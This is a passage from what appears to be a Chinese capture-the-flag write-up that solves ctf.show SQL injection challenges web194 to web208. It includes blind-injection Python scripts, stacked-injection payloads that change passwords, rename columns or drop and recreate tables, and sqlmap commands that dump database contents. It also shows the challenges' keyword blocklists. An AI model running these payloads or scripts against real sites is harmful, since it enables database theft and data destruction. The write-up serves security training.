punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid </code></pre><h4 id="web194-lpad"><a href="#web194-lpad" class="headerlink" title="web194(lpad)"></a>web194(lpad)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex|substr|char|left|right|substring/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>left</code> <code>right</code>被ban了，可以直接正则匹配，不过直接正则的方法有局限</p><p>找一找其他和截取有关的函数，发现<code>lpad()</code>。</p><p><code>lpad(str,len,padstr)</code><br><code>lpad()</code>函数返回字符串<code>str</code>，<code>len</code>小于字符串长度相当于字符串截取；大于字符串长度，则在左填充用字符串<code>padstr</code>直到达到<code>len</code>字符长度。</p><p>有左填充，一般就是右填充，找到<code>rpad()</code>，用法和<code>lpad()</code>类似。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://8be98a09-12b0-4f66-807f-899826d58216.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">",_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789"</span>tempstr <span class="token operator">=</span> <span class="token string">""</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment">#payload = "admin'and ((lpad((select database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_flxg</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,'')='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            tempstr <span class="token operator">+=</span> mid            flag <span class="token operator">+=</span> mid            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web195-堆叠注入"><a href="#web195-堆叠注入" class="headerlink" title="web195(堆叠注入)"></a>web195(堆叠注入)</h4><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//密码检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>过滤了select，单双引号也被过滤，没有报错提示。</p><p>没有过滤分号，考虑堆叠注入。但不能有空格，可以通过反引号包裹表名等信息的方式绕过空格过滤。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token identifier"><span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span></span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span></code></pre><p>这里用update将pass改为1，可以登陆成功</p><p>因为查询语句的where判断是<code>username=&#123;$username&#125;</code>，并没有引号包裹，那么就可以输入数字了。</p><p>sql里，数字和字符串的匹配是弱类型比较，字符串会转换为数字，如<code>0==admin</code>，那么如果输入的username是0，则会匹配所有开头不</p><p>是数字或者为0的字符串和数字0</p><p>但是可以使用另一种方法</p><pre class="language-sql" data-language="sql"><code class="language-sql">payload<span class="token operator">=</span><span class="token string">"0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"</span><span class="token comment"># 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = &#123;$username&#125;;"</span><span class="token punctuation">;</span></code></pre><h4 id="web196-select-row-0"><a href="#web196-select-row-0" class="headerlink" title="web196(select row[0])"></a>web196(select row[0])</h4><p>这道题目的select虽然写的是被过滤了，但是实际并没有被过滤。（根据群里的反馈，说群主本来是打算把过滤select写成se1ect，但是</p><p>忘记改了。不过se1ect也并没有被过滤，感觉纯粹就是没有加select的过滤～）</p><p>可以用select绕过password的if判断。</p><p>判断条件满足的设定是<code>$row[0]==$password</code>，$row存储的是结果集中的一行数据，$row[0]就是这一行的第一个数据。既然可以堆叠注</p><p>入，就是可以多语句查询，$row应该也会逐一循环获取每个结果集。</p><p>那么可以输入username为<code>1;select(9)</code>，password为9。当$row获取到第二个查询语句select(9)的结果集时，即可获得$row[0]&#x3D;9，那</p><p>么password输入9就可以满足条件判断。同样输入其他密码也可以</p><h4 id="web197-alert修改字段-show-tables-drop"><a href="#web197-alert修改字段-show-tables-drop" class="headerlink" title="web197(alert修改字段  show tables  drop)"></a>web197(alert修改字段  show tables  drop)</h4><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>这次select被ban了</p><p><strong>方法一</strong></p><p>利用<code>show</code>。根据题目给的查询语句，可以知道数据库的表名为ctfshow_user，那么可以通过<code>show tables</code>，获取表名的结果集，在这个</p><p>结果集里定然有一行的数据为ctfshow_user。</p><p>用户名：<code>1;show tables</code></p><p>密码：<code>ctfshow_user</code></p><p><strong>方法二</strong></p><p>可以利用<code>alter</code>修改字段名，把<code>id</code>和<code>pass</code>对调，然后爆破id。</p><p><strong>ALTER TABLE</strong> 语句用于在已有的表中添加、修改或删除列。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change column &#96;pass&#96; &#96;a&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;a&#96; &#96;id&#96; varchar(255)</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1a4c8604-7c24-4000-a07a-b9c23f8c0ca3.challenge.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>  <span class="token comment"># 0</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"登陆成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+]id </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> is right"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><strong>方法三</strong></p><p>更新表。过滤了update，但我们可以删表，重新建一个同样表名的表，列名给的查询语句也已经告知，分别是username和pass。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;drop table ctfshow_user;create table ctfshow_user(&#96;username&#96; varchar(100),&#96;pass&#96; varchar(100));insert ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(1,1)</code></pre><p>这里的意思就是删除以前的表，再自己新建一个并且插入数据：username&#x3D;1，pass&#x3D;1</p><p>然后直接输入1为用户名和密码，登录即可得到flag。</p><h4 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h4><p>过滤了<code>create</code> <code>drop</code>，但可以用其他方法</p><h4 id="wen199"><a href="#wen199" class="headerlink" title="wen199"></a>wen199</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><strong>方法一</strong>：本题依然可以使用<code>show tables</code>。</p><p><strong>方法二</strong>：本题过滤了括号，限制了之前payload中的varchar(100)，可以改为text。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change &#96;pass&#96; &#96;tmp&#96; text;alter table ctfshow_user change &#96;username&#96; &#96;pass&#96; text;alter table ctfshow_user change &#96;tmp&#96; &#96;username&#96; text;</code></pre><h4 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h4><p>增加了逗号的过滤，不影响。web199的两个方法都可以用。</p><h4 id="web201-Sqlmap-–referer"><a href="#web201-Sqlmap-–referer" class="headerlink" title="web201(Sqlmap –referer)"></a>web201(Sqlmap –referer)</h4><p><a href="https://sqlmap.highlight.ink/"><a href="https://sqlmap.highlight.ink/">sqlmap 用户手册</a></a></p><p>SQLmap使用顺序：</p><ol><li>获取当前MySQL中的所有数据库<code>sqlmap -u http://xxx</code></li><li>获取当前数据库名字</li><li>获取数据库下的数据表</li><li>获取表下的列名</li><li>导出数据</li></ol><p><img src="web201.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_43621629/article/details/104515866">Sqlmap 性能优化</a></p><p>设置多线程</p><pre class="language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://127.0.0.1/sqli/Less-1/?id=1"</span> <span class="token parameter variable">--threads</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--banner</span> <span class="token parameter variable">-v</span> <span class="token number">5</span></code></pre><p>要添加一个referer头</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查数据库：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -dbs</code></pre><p><img src="web201_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查表名：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables</code></pre><p><img src="web201_3.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查列名：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</code></pre><p><img src="web201_4.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">查Flag：python sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><p><img src="web201_5.png" loading="lazy"></p><h4 id="web202-–data"><a href="#web202-–data" class="headerlink" title="web202(–data)"></a>web202(–data)</h4><p>–data&#x3D;DATA         该参数指定的数据会被作为POST数据提交</p><p>使用post方式进行注入，可以直接用<code>--data=&quot;id=1&quot;</code>，也可以<code>--method=post</code>来触发</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1.使用data调整参数python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot;2.查库python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbs3.查表python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web --tables4.查列python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user --columns5.查Flagpython sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web203-–method-PUT"><a href="#web203-–method-PUT" class="headerlink" title="web203(–method&#x3D;PUT)"></a>web203(–method&#x3D;PUT)</h4><p><strong>HTTP <code>PUT</code> 请求方法</strong>创建一个新的资源或用请求的有效载荷替换目标资源的表示。</p><p><code>PUT</code> 与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> 方法的区别是，<code>PUT</code> 方法是幂等的：调用一次与连续调用多次效果是相同的（即没有<em>副</em>作用），而连续调用多次相同的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> 方法可能会有副作用，比如多次提交同一订单。</p><p>指定<code>--method=PUT</code>方法，同时**加上<code>--headers=&quot;Content-Type:text/plain</code>**，否则put接受不了。同时，要加上index.php，<code>url/api/index.php</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;6792f785-47eb-4ea4-b098-0123488759c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web204-–cookie"><a href="#web204-–cookie" class="headerlink" title="web204(–cookie)"></a>web204(–cookie)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql dbs&#x3D;ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web205-api权限"><a href="#web205-api权限" class="headerlink" title="web205(api权限)"></a>web205(api权限)</h4><p>api调用需要鉴权</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span>safe<span class="token operator">-</span>url 设置在测试目标地址前访问的安全链接<span class="token operator">--</span>safe<span class="token operator">-</span>freq 设置两次注入测试前访问安全链接的次数</code></pre><p>通过F12中network抓包可以看见，有一个<code>getToken.php</code>的请求token的动作；</p><p><img src="web205.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;bllqt44686hm6msc9ti5ruevpb&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flax -C flagx --dump</code></pre><p>这个题换了表名和列名</p><h4 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h4><p>sql需要闭合，sqlmap会自动闭合，Payload同上</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;3ehcblk49o3nqd3hp3nqsdr0ga&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</code></pre><h4 id="web207-–tamper"><a href="#web207-–tamper" class="headerlink" title="web207(–tamper)"></a>web207(–tamper)</h4><p><a href="https://y4er.com/posts/sqlmap-tamper/">Sqlmap Tamper 编写</a></p><p><code>--batch</code>使用默认的选项进行注入，无需用户输入和交互<br><code>--prefix=PREFIX</code>指定payload的前缀<br><code>--suffix=SUFFIX</code>指定payload的后缀</p><p>题目对空格进行了过滤，所以我们可以考虑用space2comment.py这个脚本，将空格转换成注释符来绕过</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h4><p>对小写的<code>select</code>和空格进行了绕过，不过sqlmap中的select都是大写的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> os<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>common <span class="token keyword">import</span> singleTimeWarnMessage<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> DBMS<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHEST<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"select"</span><span class="token punctuation">)</span><span class="token comment">#就修改这一行了</span>    <span class="token keyword">return</span> payload</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; 